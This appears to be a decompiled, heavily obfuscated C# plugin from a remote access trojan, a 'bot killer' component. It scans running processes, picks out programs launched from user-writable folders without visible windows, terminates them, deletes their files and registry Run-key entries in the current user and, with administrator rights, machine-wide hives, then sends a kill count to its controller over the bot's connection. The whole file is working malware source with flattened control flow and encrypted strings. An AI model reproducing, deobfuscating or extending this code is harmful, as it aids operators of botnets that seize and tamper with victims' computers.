using System;
using System.Diagnostics;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Security.Principal;
using HsZcU78F13T1yLWI1V;
using MessagePackLib.MessagePack;
using Microsoft.Win32;
using Plugin;
using UY3BiEArlp6B4GPt9k;

namespace Miscellaneous.Handler;

public class HandleBotKiller
{
	private int count;

	internal static HandleBotKiller QdcT4mK1oi4Mt6G2L6;

	[MethodImpl(MethodImplOptions.NoInlining)]
	public void RunBotKiller()
	{
		int num = 6;
		int num3 = default(int);
		Process[] array = default(Process[]);
		Process process = default(Process);
		string text = default(string);
		int num5 = default(int);
		while (true)
		{
			int num2 = num;
			while (true)
			{
				switch (num2)
				{
				case 4:
				case 9:
					if (num3 < array.Length)
					{
						num2 = 10;
						continue;
					}
					goto case 1;
				case 8:
					num3++;
					num2 = 4;
					continue;
				case 2:
					return;
				case 3:
				{
					MsgPack msgPack = new MsgPack();
					((MsgPack)kAETGt46l1w7MxWGV3(msgPack, Fqj0qNYdeZbJftjhAM(440))).AsString = (string)Fqj0qNYdeZbJftjhAM(456);
					((MsgPack)kAETGt46l1w7MxWGV3(msgPack, Fqj0qNYdeZbJftjhAM(478))).AsString = cbLXIf3N1mS6UVHGff.cnL5MhNQE(ref count, cbLXIf3N1mS6UVHGff.cs6ARTRRM);
					AGISVYuJNV9u24w8SV(Xscnh8hwH5lQgb5m0c(msgPack));
					num2 = 2;
					if (oaTATFLROEpy1uv3nN() == null)
					{
						continue;
					}
					break;
				}
				case 7:
				case 10:
					process = array[num3];
					num2 = 0;
					if (oaTATFLROEpy1uv3nN() == null)
					{
						continue;
					}
					break;
				default:
					try
					{
						int num4;
						if (!Inspection((string)HFxaXBJwdKYhTNwKKh(HFxaXBJwdKYhTNwKKh(mBpWiGi3VJitn1Uwtk(process, edXG09OU9b9H7roCWA.YJ6l5OXTv), zVYIKQMSYiXDLtRkIF.Eo1hWNRmI), zVYIKQMSYiXDLtRkIF.OnqnfA4Ys)))
						{
							num4 = 8;
							goto IL_015e;
						}
						goto IL_02c4;
						IL_0231:
						text = zVYIKQMSYiXDLtRkIF.cnL5MhNQE(mBpWiGi3VJitn1Uwtk(process, edXG09OU9b9H7roCWA.YJ6l5OXTv), zVYIKQMSYiXDLtRkIF.Eo1hWNRmI);
						num4 = 2;
						if (!m5ncB3k66fEEbWjnyD())
						{
							goto IL_015a;
						}
						goto IL_015e;
						IL_015e:
						while (true)
						{
							switch (num4)
							{
							case 3:
								break;
							case 10:
								RegistryDelete(Fqj0qNYdeZbJftjhAM(338), text);
								num4 = 6;
								continue;
							case 11:
								MQUD45os060qTuieAr(Fqj0qNYdeZbJftjhAM(244), text);
								num4 = 10;
								continue;
							case 4:
								HFQpKgw5QxkTihr2ok(text, gCkCyjFABY2D0bJoV7.lNDeHTkKd);
								num4 = 4;
								if (oaTATFLROEpy1uv3nN() == null)
								{
									num4 = 7;
								}
								continue;
							case 1:
								goto end_IL_015e;
							default:
								goto IL_0231;
							case 8:
								goto end_IL_015e;
							case 7:
								goto IL_026d;
							case 2:
								goto IL_0291;
							case 6:
								WTEc8HliNvVD1Ois54(200, ThQYPEdOtoI0yBsIqM.wcOEk6BtN);
								num4 = 4;
								continue;
							case 5:
								goto IL_02c4;
							case 9:
								goto end_IL_015e;
							}
							count++;
							num4 = 9;
							if (oaTATFLROEpy1uv3nN() == null)
							{
								continue;
							}
							goto IL_015a;
							IL_0291:
							xoRAhX7vZnAU6ouQJf.cnL5MhNQE(process, xoRAhX7vZnAU6ouQJf.qoi1wI2c5);
							num5 = 11;
							goto IL_015a;
							IL_026d:
							WTEc8HliNvVD1Ois54(200, ThQYPEdOtoI0yBsIqM.wcOEk6BtN);
							num4 = 3;
							if (oaTATFLROEpy1uv3nN() == null)
							{
								continue;
							}
							goto IL_015a;
							continue;
							end_IL_015e:
							break;
						}
						goto end_IL_0125;
						IL_015a:
						num4 = num5;
						goto IL_015e;
						IL_02c4:
						if (IsWindowVisible(mKjDaZW9RYW9eyXXTC(process, AOtkLGrEvR79kJmGiE.n12K7Zuv1)))
						{
							num4 = 1;
							if (!m5ncB3k66fEEbWjnyD())
							{
								goto IL_015a;
							}
							goto IL_015e;
						}
						goto IL_0231;
						end_IL_0125:;
					}
					catch
					{
						int num6 = 0;
						if (oaTATFLROEpy1uv3nN() != null)
						{
							num6 = 0;
						}
						switch (num6)
						{
						case 0:
							break;
						}
					}
					goto case 8;
				case 1:
					if (count <= 0)
					{
						return;
					}
					num2 = 3;
					continue;
				case 5:
					num3 = 0;
					num2 = 9;
					continue;
				case 6:
					array = (Process[])jwLlbZNVMXyvnXIXDk(feU0oZpgmNNtMFRVhx.SKtYrn5K8);
					num = 5;
					break;
				}
				break;
			}
		}
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	private bool Inspection(string threat)
	{
		int num = 5;
		while (true)
		{
			int num2 = num;
			while (true)
			{
				switch (num2)
				{
				case 1:
					return true;
				case 6:
					if (!QjGsFxbsR6LFdu2Xjq(threat, HFxaXBJwdKYhTNwKKh(bUUmWj870aOUTUG5HX(Environment.GetFolderPath(Environment.SpecialFolder.Windows), Fqj0qNYdeZbJftjhAM(518), BE8yW85SsYafw4VLBln.hh15Wdddyi), zVYIKQMSYiXDLtRkIF.OnqnfA4Ys), j1cHUe598IDHpZ30AxZ.C1455GNETX))
					{
						num2 = 7;
						continue;
					}
					goto case 2;
				case 8:
					return true;
				case 2:
					return true;
				case 7:
					return false;
				case 5:
					if (!EBv2EvHMLF0SrF8E7D(threat, HFxaXBJwdKYhTNwKKh(HFxaXBJwdKYhTNwKKh(edXG09OU9b9H7roCWA.cnL5MhNQE(iQK6fvvtO9Ne0ed9tK(X9fjAgfrVrelRUHRal.v4PzZkewB), edXG09OU9b9H7roCWA.YJ6l5OXTv), zVYIKQMSYiXDLtRkIF.Eo1hWNRmI), zVYIKQMSYiXDLtRkIF.OnqnfA4Ys), RbXy5yvn4JjKpY18qt.W8K8WSOGF))
					{
						num2 = 4;
						if (oaTATFLROEpy1uv3nN() == null)
						{
							continue;
						}
						break;
					}
					goto default;
				case 3:
					return true;
				default:
					return false;
				case 4:
					if (!QjGsFxbsR6LFdu2Xjq(threat, HFxaXBJwdKYhTNwKKh(pNyFT9FkfB63QrHgIC(Environment.SpecialFolder.CommonApplicationData), zVYIKQMSYiXDLtRkIF.OnqnfA4Ys), j1cHUe598IDHpZ30AxZ.C1455GNETX))
					{
						if (!j1cHUe598IDHpZ30AxZ.cnL5MhNQE(threat, (string)HFxaXBJwdKYhTNwKKh(pNyFT9FkfB63QrHgIC(Environment.SpecialFolder.UserProfile), zVYIKQMSYiXDLtRkIF.OnqnfA4Ys), j1cHUe598IDHpZ30AxZ.C1455GNETX))
						{
							if (!QjGsFxbsR6LFdu2Xjq(threat, Fqj0qNYdeZbJftjhAM(492), j1cHUe598IDHpZ30AxZ.Xl45qWrHxg))
							{
								num2 = 6;
								continue;
							}
							goto case 1;
						}
						num = 8;
						break;
					}
					num2 = 3;
					continue;
				}
				break;
			}
		}
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	private bool IsWindowVisible(string lHandle)
	{
		return IsWindowVisible(lHandle);
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	private static void RegistryDelete(object regPath, object payload)
	{
		switch (1)
		{
		case 1:
			try
			{
				RegistryKey registryKey = (RegistryKey)HMxWCEOK9Ol9l022KX(Registry.CurrentUser, regPath, true, qCqWZ35LZklYkq8nN1O.QwP5v1N1yW);
				int num = 0;
				if (!m5ncB3k66fEEbWjnyD())
				{
					goto IL_004d;
				}
				goto IL_0051;
				IL_004d:
				int num2 = default(int);
				num = num2;
				goto IL_0051;
				IL_0051:
				int num8 = default(int);
				string[] array = default(string[]);
				string text2 = default(string);
				int num4 = default(int);
				RegistryKey registryKey2 = default(RegistryKey);
				string text = default(string);
				int num5 = default(int);
				do
				{
					IL_0051_2:
					switch (num)
					{
					default:
						try
						{
							int num7;
							if (registryKey == null)
							{
								num7 = 0;
								if (oaTATFLROEpy1uv3nN() == null)
								{
									num7 = 0;
								}
								goto IL_0095;
							}
							goto IL_0154;
							IL_0091:
							num7 = num8;
							goto IL_0095;
							IL_0154:
							array = dAVu0Y58El4dHC3eP7t.cnL5MhNQE(registryKey, dAVu0Y58El4dHC3eP7t.lZH5Hryg8w);
							num8 = 9;
							goto IL_0091;
							IL_0095:
							while (true)
							{
								switch (num7)
								{
								case 0:
									break;
								case 5:
									text2 = array[num4];
									num7 = 8;
									continue;
								case 8:
									if (!j1cHUe598IDHpZ30AxZ.cnL5MhNQE(HFxaXBJwdKYhTNwKKh(BSeITd6G2VhHn3drr4.cnL5MhNQE(registryKey, text2, BSeITd6G2VhHn3drr4.kpl5m4plpZ), zVYIKQMSYiXDLtRkIF.gHC5xh3KTY), (string)payload, j1cHUe598IDHpZ30AxZ.gT95ZhriZu))
									{
										num7 = 1;
										if (m5ncB3k66fEEbWjnyD())
										{
											num7 = 1;
										}
										continue;
									}
									goto case 3;
								case 10:
									goto IL_0154;
								case 3:
									Ba4WFy1t3LeDsLgHFC(registryKey, text2, kdcg46TA0IYwy3FDnZ.TUY5gn5xXE);
									num7 = 7;
									continue;
								case 4:
								case 6:
									if (num4 >= array.Length)
									{
										num7 = 2;
										continue;
									}
									goto case 5;
								case 9:
									goto IL_01ac;
								case 1:
								case 7:
									goto IL_01c4;
								case 2:
									break;
								}
								break;
								IL_01c4:
								num4++;
								num7 = 4;
								if (oaTATFLROEpy1uv3nN() == null)
								{
									continue;
								}
								goto IL_0091;
								IL_01ac:
								num4 = 0;
								num7 = 6;
								if (m5ncB3k66fEEbWjnyD())
								{
									continue;
								}
								goto IL_0091;
							}
						}
						finally
						{
							if (registryKey != null)
							{
								int num9 = 1;
								if (oaTATFLROEpy1uv3nN() != null)
								{
									num9 = 0;
								}
								while (true)
								{
									switch (num9)
									{
									case 1:
										q6e7e3E4QfU0HxC702(registryKey, xoRAhX7vZnAU6ouQJf.rBhN0MfTk);
										num9 = 0;
										if (oaTATFLROEpy1uv3nN() == null)
										{
											num9 = 0;
										}
										continue;
									case 0:
										break;
									}
									break;
								}
							}
						}
						goto case 1;
					case 2:
						try
						{
							int num3;
							if (registryKey2 == null)
							{
								num3 = 3;
								goto IL_0272;
							}
							goto IL_0348;
							IL_0348:
							array = (string[])vtl1QmB06h2UUGvruG(registryKey2, dAVu0Y58El4dHC3eP7t.lZH5Hryg8w);
							num3 = 9;
							goto IL_0272;
							IL_0272:
							while (true)
							{
								switch (num3)
								{
								default:
									if (num4 >= array.Length)
									{
										num3 = 1;
										if (m5ncB3k66fEEbWjnyD())
										{
											continue;
										}
										goto IL_026e;
									}
									goto case 7;
								case 2:
									if (!QjGsFxbsR6LFdu2Xjq(zVYIKQMSYiXDLtRkIF.cnL5MhNQE(t29g98MwC6abXwhNWc(registryKey2, text, BSeITd6G2VhHn3drr4.kpl5m4plpZ), zVYIKQMSYiXDLtRkIF.gHC5xh3KTY), payload, j1cHUe598IDHpZ30AxZ.gT95ZhriZu))
									{
										num3 = 4;
										continue;
									}
									goto case 10;
								case 3:
									return;
								case 9:
									num4 = 0;
									num3 = 6;
									continue;
								case 10:
									Ba4WFy1t3LeDsLgHFC(registryKey2, text, kdcg46TA0IYwy3FDnZ.TUY5gn5xXE);
									num3 = 5;
									continue;
								case 8:
									break;
								case 4:
								case 5:
									num4++;
									num3 = 0;
									if (m5ncB3k66fEEbWjnyD())
									{
										continue;
									}
									goto IL_026e;
								case 7:
									text = array[num4];
									num3 = 2;
									if (m5ncB3k66fEEbWjnyD())
									{
										continue;
									}
									goto IL_026e;
								case 1:
									return;
									IL_026e:
									num3 = num5;
									continue;
								}
								break;
							}
							goto IL_0348;
						}
						finally
						{
							int num6;
							if (registryKey2 == null)
							{
								num6 = 2;
								goto IL_03cf;
							}
							goto IL_03e5;
							IL_03e5:
							q6e7e3E4QfU0HxC702(registryKey2, xoRAhX7vZnAU6ouQJf.rBhN0MfTk);
							num6 = 1;
							if (oaTATFLROEpy1uv3nN() != null)
							{
								num6 = 0;
							}
							goto IL_03cf;
							IL_03cf:
							switch (num6)
							{
							case 2:
								goto end_IL_03ba;
							case 1:
								goto end_IL_03ba;
							}
							goto IL_03e5;
							end_IL_03ba:;
						}
					case 4:
						break;
					case 1:
						if (SVyMqnTfpZoR3AlctE(new WindowsPrincipal((WindowsIdentity)Xj1NWbylAcVlPny8os(nXrOfp5TPuBapV0vd2M.MxC5oRsyb8)), WindowsBuiltInRole.Administrator, ADdacR5Q7jBj4S9hiH0.wVQ5G5DJas))
						{
							num = 4;
							goto IL_0051_2;
						}
						return;
					case 3:
						return;
					}
					registryKey2 = (RegistryKey)HMxWCEOK9Ol9l022KX(Registry.LocalMachine, regPath, true, qCqWZ35LZklYkq8nN1O.QwP5v1N1yW);
					num = 2;
				}
				while (m5ncB3k66fEEbWjnyD());
				goto IL_004d;
			}
			catch (Exception)
			{
				int num10 = 0;
				if (!m5ncB3k66fEEbWjnyD())
				{
					int num11 = default(int);
					num10 = num11;
				}
				switch (num10)
				{
				case 0:
					break;
				}
				break;
			}
		case 0:
			break;
		}
	}

	[DllImport("user32.dll")]
	[return: MarshalAs(UnmanagedType.Bool)]
	private static extern bool IsWindowVisible(IntPtr hWnd);

	[MethodImpl(MethodImplOptions.NoInlining)]
	public HandleBotKiller()
	{
		KjTCGi6lVu8cxcKHg3();
		base._002Ector();
		int num = 0;
		if (0 == 0)
		{
			num = 0;
		}
		switch (num)
		{
		case 0:
			break;
		}
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	internal static object jwLlbZNVMXyvnXIXDk(object P_0)
	{
		return feU0oZpgmNNtMFRVhx.cnL5MhNQE((feU0oZpgmNNtMFRVhx)P_0);
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	internal static object mBpWiGi3VJitn1Uwtk(object P_0, object P_1)
	{
		return edXG09OU9b9H7roCWA.cnL5MhNQE(P_0, (edXG09OU9b9H7roCWA)P_1);
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	internal static object HFxaXBJwdKYhTNwKKh(object P_0, object P_1)
	{
		return zVYIKQMSYiXDLtRkIF.cnL5MhNQE(P_0, (zVYIKQMSYiXDLtRkIF)P_1);
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	internal static IntPtr mKjDaZW9RYW9eyXXTC(object P_0, object P_1)
	{
		return AOtkLGrEvR79kJmGiE.cnL5MhNQE(P_0, (AOtkLGrEvR79kJmGiE)P_1);
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	internal static object Fqj0qNYdeZbJftjhAM(int P_0)
	{
		return nCP5vtxT3QjsSeuiK3.xuCtsHmOK(P_0);
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	internal static void MQUD45os060qTuieAr(object P_0, object P_1)
	{
		RegistryDelete(P_0, P_1);
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	internal static void WTEc8HliNvVD1Ois54(int P_0, object P_1)
	{
		ThQYPEdOtoI0yBsIqM.cnL5MhNQE(P_0, (ThQYPEdOtoI0yBsIqM)P_1);
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	internal static void HFQpKgw5QxkTihr2ok(object P_0, object P_1)
	{
		gCkCyjFABY2D0bJoV7.cnL5MhNQE((string)P_0, (gCkCyjFABY2D0bJoV7)P_1);
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	internal static object kAETGt46l1w7MxWGV3(object P_0, object P_1)
	{
		return ((MsgPack)P_0).ForcePathObject((string)P_1);
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	internal static object Xscnh8hwH5lQgb5m0c(object P_0)
	{
		return ((MsgPack)P_0).Encode2Bytes();
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	internal static void AGISVYuJNV9u24w8SV(object P_0)
	{
		Connection.Send((byte[])P_0);
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	internal static bool m5ncB3k66fEEbWjnyD()
	{
		return QdcT4mK1oi4Mt6G2L6 == null;
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	internal static HandleBotKiller oaTATFLROEpy1uv3nN()
	{
		return QdcT4mK1oi4Mt6G2L6;
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	internal static object iQK6fvvtO9Ne0ed9tK(object P_0)
	{
		return X9fjAgfrVrelRUHRal.cnL5MhNQE((X9fjAgfrVrelRUHRal)P_0);
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	internal static bool EBv2EvHMLF0SrF8E7D(object P_0, object P_1, object P_2)
	{
		return RbXy5yvn4JjKpY18qt.cnL5MhNQE((string)P_0, (string)P_1, (RbXy5yvn4JjKpY18qt)P_2);
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	internal static object pNyFT9FkfB63QrHgIC(Environment.SpecialFolder P_0)
	{
		return Environment.GetFolderPath(P_0);
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	internal static bool QjGsFxbsR6LFdu2Xjq(object P_0, object P_1, object P_2)
	{
		return j1cHUe598IDHpZ30AxZ.cnL5MhNQE(P_0, (string)P_1, (j1cHUe598IDHpZ30AxZ)P_2);
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	internal static object bUUmWj870aOUTUG5HX(object P_0, object P_1, object P_2)
	{
		return BE8yW85SsYafw4VLBln.cnL5MhNQE((string)P_0, (string)P_1, (BE8yW85SsYafw4VLBln)P_2);
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	internal static object HMxWCEOK9Ol9l022KX(object P_0, object P_1, bool P_2, object P_3)
	{
		return qCqWZ35LZklYkq8nN1O.cnL5MhNQE(P_0, (string)P_1, P_2, (qCqWZ35LZklYkq8nN1O)P_3);
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	internal static void Ba4WFy1t3LeDsLgHFC(object P_0, object P_1, object P_2)
	{
		kdcg46TA0IYwy3FDnZ.cnL5MhNQE(P_0, (string)P_1, (kdcg46TA0IYwy3FDnZ)P_2);
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	internal static void q6e7e3E4QfU0HxC702(object P_0, object P_1)
	{
		xoRAhX7vZnAU6ouQJf.cnL5MhNQE(P_0, (xoRAhX7vZnAU6ouQJf)P_1);
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	internal static object Xj1NWbylAcVlPny8os(object P_0)
	{
		return nXrOfp5TPuBapV0vd2M.cnL5MhNQE((nXrOfp5TPuBapV0vd2M)P_0);
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	internal static bool SVyMqnTfpZoR3AlctE(object P_0, WindowsBuiltInRole P_1, object P_2)
	{
		return ADdacR5Q7jBj4S9hiH0.cnL5MhNQE(P_0, P_1, (ADdacR5Q7jBj4S9hiH0)P_2);
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	internal static object vtl1QmB06h2UUGvruG(object P_0, object P_1)
	{
		return dAVu0Y58El4dHC3eP7t.cnL5MhNQE(P_0, (dAVu0Y58El4dHC3eP7t)P_1);
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	internal static object t29g98MwC6abXwhNWc(object P_0, object P_1, object P_2)
	{
		return BSeITd6G2VhHn3drr4.cnL5MhNQE(P_0, (string)P_1, (BSeITd6G2VhHn3drr4)P_2);
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	internal static void KjTCGi6lVu8cxcKHg3()
	{
		WkMgYHbfSUMGdoITRx.Mwxkyt2zf90Xh();
	}
}
